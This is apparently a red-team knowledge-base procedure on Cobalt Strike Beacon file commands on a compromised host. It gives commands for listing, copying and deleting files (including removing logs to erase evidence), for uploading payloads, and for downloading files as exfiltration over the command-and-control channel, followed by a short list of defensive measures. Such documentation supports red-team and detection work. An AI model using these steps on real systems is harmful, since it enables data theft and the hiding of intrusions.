---
type: procedure
description: >-
  Perform file operations on a compromised host using Cobalt Strike Beacon
  commands for uploading, downloading, listing, copying, and deleting files.
tactics:
  - '[[Command and Control]]'
  - '[[Collection]]'
  - '[[Exfiltration]]'
techniques:
  - '[[Remote File Copy]]'
  - '[[Exfiltration Over Command and Control Channel]]'
  - '[[File Deletion]]'
sub_techniques: []
tags:
  - cobalt-strike
  - file-management
  - post-exploitation
  - beacon
commands:
  - '[[commands/cobalt-strike-cancel-download]]'
  - '[[commands/cobalt-strike-change-working-directory]]'
  - '[[commands/cobalt-strike-copy-file]]'
  - '[[commands/cobalt-strike-delete-file-or-folder]]'
  - '[[commands/cobalt-strike-download-file]]'
  - '[[commands/cobalt-strike-list-directory-contents]]'
  - '[[commands/cobalt-strike-list-downloads]]'
  - '[[commands/cobalt-strike-upload-file]]'
platforms:
  - Windows
  - Linux
tools:
  - '[[tools/Cobalt-Strike]]'
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# Cobalt-Strike-File-Management

## Summary

This procedure enables attackers to manage files on a compromised Windows or Linux host via Cobalt Strike's Beacon implant. It covers listing directories, navigating file systems, copying, deleting, uploading, and downloading files, which supports post-exploitation tasks like data exfiltration, payload deployment, and cleanup.

## Description

Cobalt Strike's Beacon provides a set of file management commands executed through the C2 channel to the implant on the target system. These operations allow manipulation of the file system without direct interactive access, reducing detection risk compared to full remote shells. Use this in scenarios where initial access is gained (e.g., via phishing or exploit), and the goal is to stage payloads, steal data, or persist by modifying files. The commands operate asynchronously where possible to maintain operational security. Prerequisites include an active Beacon session on the target, typically established via an initial payload delivery.

## Requirements

1. Active Cobalt Strike team server with a Beacon session connected to the compromised host.
2. Knowledge of the target's file system paths (e.g., C:\Windows on Windows, /etc on Linux).
3. Attacker-controlled file for uploads (e.g., payloads or tools).
4. Network connectivity between C2 server and target for command transmission.

## Defense

- Monitor for anomalous file creations, modifications, or deletions using file integrity monitoring (FIM) tools like OSSEC or Windows Audit Policy.
- Implement application whitelisting to block unauthorized binaries that could host implants.
- Enable endpoint detection and response (EDR) solutions to flag C2-like network patterns and process injections associated with Beacon.
- Log and alert on SMB/HTTP traffic spikes indicative of file transfers over C2 channels.

## Objectives

1. Navigate and inspect the target file system to identify valuable data or persistence locations.
2. Transfer files to/from the target for payload execution or data theft.
3. Clean up traces by deleting logs or temporary files.
4. Achieve persistence or lateral movement by copying configuration files or credentials.

## Instructions

### Step 1: List Directory Contents

**Context**: Begin by enumerating files in a target directory to understand the file system structure and locate items of interest, such as configuration files or user data.

**Command** ([[commands/cobalt-strike-list-directory-contents]]):
```bash
beacon > ls $_PATH
```

> This command lists files and directories at the specified path. Use it recursively with 'ls -r' if needed for deeper exploration. Expected output includes file names, sizes, and timestamps.

### Step 2: Change Working Directory

**Context**: Switch the Beacon's current working directory to simplify subsequent file operations without repeatedly specifying full paths.

**Command** ([[commands/cobalt-strike-change-working-directory]]):
```bash
beacon > cd $_DIRECTORY
```

> Sets the working directory for future commands like ls or upload. Verify with a subsequent ls command. Success is indicated by no error and updated path in Beacon feedback.

### Step 3: Copy File

**Context**: Duplicate files on the target to backup data before modification or to stage files for lateral movement.

**Command** ([[commands/cobalt-strike-copy-file]]):
```bash
beacon > cp $_SOURCE $_DESTINATION
```

> Copies from source to destination path. Handles both files and directories. Expected output confirms completion without errors.

### Step 4: Delete File or Folder

**Context**: Remove files or folders to erase evidence, such as logs or temporary payloads, minimizing forensic footprints.

**Command** ([[commands/cobalt-strike-delete-file-or-folder]]):
```bash
beacon > rm $_PATH
```

> Deletes the specified file or folder recursively if needed (use -r for directories). Confirm deletion with a follow-up ls. Success shows no remaining entry in directory listing.

### Step 5: Upload File

**Context**: Transfer tools, payloads, or malware from the attacker's system to the target for execution or staging.

**Command** ([[commands/cobalt-strike-upload-file]]):
```bash
beacon > upload $_LOCAL_PATH
```

> Uploads the file to the current working directory on the target. Monitor progress if large. Expected output includes transfer completion and target path.

### Step 6: Download File

**Context**: Exfiltrate sensitive files like credentials or documents from the target back to the attacker.

**Command** ([[commands/cobalt-strike-download-file]]):
```bash
beacon > download $_REMOTE_PATH
```

> Initiates asynchronous download to the team server. Files are saved in the team's loot directory. Expected output shows download ID for tracking.

### Step 7: List Downloads

**Context**: Check the status of ongoing downloads to ensure data exfiltration completes successfully.

**Command** ([[commands/cobalt-strike-list-downloads]]):
```bash
beacon > downloads
```

> Displays a list of active downloads with IDs, paths, and progress. Use this after initiating multiple downloads.

### Step 8: Cancel Download

**Context**: Abort a download if it's compromised or unnecessary to avoid unnecessary traffic or detection.

**Command** ([[commands/cobalt-strike-cancel-download]]):
```bash
beacon > cancel $_FILE_ID
```

> Cancels the specified download by ID from the downloads list. Expected output confirms cancellation.
